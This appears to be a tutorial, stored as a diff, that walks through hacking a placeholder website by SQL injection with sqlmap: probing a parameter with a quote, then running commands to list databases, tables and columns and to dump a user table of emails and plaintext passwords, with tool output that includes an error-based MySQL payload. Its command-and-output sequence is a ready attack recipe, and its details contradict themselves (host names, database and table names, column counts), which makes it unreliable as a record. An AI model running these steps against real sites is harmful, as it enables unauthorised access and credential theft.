@@ -1,0 +1,134 @@
+root@kali:~# sqlmap --help
+So I will hack a test website and demonstrate you along with it.
+
+Identifying the vulnerability
+first of all we need to check whether the website is vulnerable to SQL attack or not.
+
+http://www.site.com/test.php?id=1
+here's our test website as you can see the website is exposing its parameter id which it should not. So we can identify the vulnerability by giving the single quote after the ID.
+
+http://www.site.com/test.php?id=1'
+we can confirm the website is vulnerable to SQL attack if it responds to an error or does any misbehavior. our website gave an error so it is vulnerable to SQL attack.
+
+Attacking the website
+Now that we know the website is vulnerable we can proceed to attack the website.
+
+scanning the website
+We can double-check by scanning the website by using the following command.
+
+$ python sqlmap.py -u "http://www.site.com/test.php?id=1"
+SQLmap will scan through the website using its powerful search engine, it scans for version, an operating system running on the target system, and returns the following info.
+
+[*] starting at 12:10:33
+[12:10:33] [INFO] resuming back-end DBMS 'mysql'
+[12:10:34] [INFO] testing connection to the target url
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=51 AND (SELECT 1489 FROM(SELECT COUNT(*),CONCAT(0x3a73776c3a,(SELECT (CASE WHEN (1489=1489) THEN 1 ELSE 0 END)),0x3a7a76653a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+---
+[12:10:37] [INFO] the back-end DBMS is MySQL
+web server operating system: FreeBSD
+web application technology: Apache 2.2.22
+back-end DBMS: MySQL 5
+We know that website is vulnerable so let's search for an available database.
+
+$ python sqlmap.py -u "http://www.sitemap.com/test.php?id=1" --dbs
+this command will scan through the target system and lists the available database.
+
+[*] starting at 12:12:56
+[12:12:56] [INFO] resuming back-end DBMS 'mysql'
+[12:12:57] [INFO] testing connection to the target url
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=51 AND (SELECT 1489 FROM(SELECT COUNT(*),CONCAT(0x3a73776c3a,(SELECT (CASE WHEN (1489=1489) THEN 1 ELSE 0 END)),0x3a7a76653a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+---
+[12:13:00] [INFO] the back-end DBMS is MySQL
+web server operating system: FreeBSD
+web application technology: Apache 2.2.22
+back-end DBMS: MySQL 5
+[12:13:00] [INFO] fetching database names
+[12:13:00] [INFO] the SQL query used returns 2 entries
+[12:13:00] [INFO] resumed: information_schema
+[12:13:00] [INFO] resumed: safecosmetics
+available databases [2]:
+[*] information_schema
+[*] sedulousrams
+here you can see it listed available databases sedulousrams seems interesting so let's see for tables available in this database with the following command.
+
+looking for tables in the database
+let's search for tables in the sedulousrams database with the following command.
+
+$ python sqlmap.py -u "http://www.site.com/test.php?id=1" --tables -D sedulousrams
+website returned following output
+
+[11:55:18] [INFO] the back-end DBMS is MySQL
+web server operating system: FreeBSD
+web application technology: Apache 2.2.22
+back-end DBMS: MySQL 5
+[11:55:18] [INFO] fetching tables for database: 'safecosmetics'
+[11:55:19] [INFO] heuristics detected web page charset 'ascii'
+[11:55:19] [INFO] the SQL query used returns 216 entries
+[11:55:20] [INFO] retrieved: acl_acl
+[11:55:21] [INFO] retrieved: acl_acl_sections
+[11:55:21] [INFO] retrieved: userinfo
+........... more tables
+Among those returned tables the userinfo table seems an interesting one. So we’ll see what columns does it have with the following command.
+
+Searching for columns in the table
+We’ll see the columns in the userinfo table using the following command.
+
+$ python sqlmap.py -u "http://www.site.com/section.php?id=1" --columns -D sedulousrams -T userinfo
+output
+
+[12:17:39] [INFO] the back-end DBMS is MySQL
+web server operating system: FreeBSD
+web application technology: Apache 2.2.22
+back-end DBMS: MySQL 5
+[12:17:39] [INFO] fetching columns for table 'users' in database 'sedulousrams'
+[12:17:41] [INFO] heuristics detected web page charset 'ascii'
+[12:17:41] [INFO] the SQL query used returns 8 entries
+[12:17:42] [INFO] retrieved: id
+[12:17:43] [INFO] retrieved: int(11)
+[12:17:45] [INFO] retrieved: name
+[12:17:46] [INFO] retrieved: text
+[12:17:47] [INFO] retrieved: password
+[12:17:48] [INFO] retrieved: text
+.......
+[12:17:59] [INFO] retrieved: hash
+[12:18:01] [INFO] retrieved: varchar(128)
+Database: sedulousrams
+Table: users
+[8 columns]
++-------------------+--------------+
+| Column            | Type         |
++-------------------+--------------+
+| email             | text         |
+| id                | int(11)      |
+| name              | text         |
+| password          | text         |
++-------------------+--------------+
+It returned some juicy info but you know what the following command will return more juicer info than this one which is user id and password.
+
+Dump the table
+The next obvious step is to dump the table which will allow us to see the actual email and password!
+
+command
+
+$ python sqlmap.py -u "http://www.site.com/section.php?id=51" --dump -D sedulousrams -T userinfo
+And here’s the juicy output we’ll be waiting for.
+
++----+-----------+---------------+----------+
+| id | name      |     email     | password | 
++----+-----------+---------------+----------+
+| 1  | admin     |admin@site.com | imsmart  |        
++----+-----------+---------------+----------+
+Here you have it, email id and password, as you can see how scarily easy it is to hack a SQL vulnerable website so secure your website before it gets hacked!
+
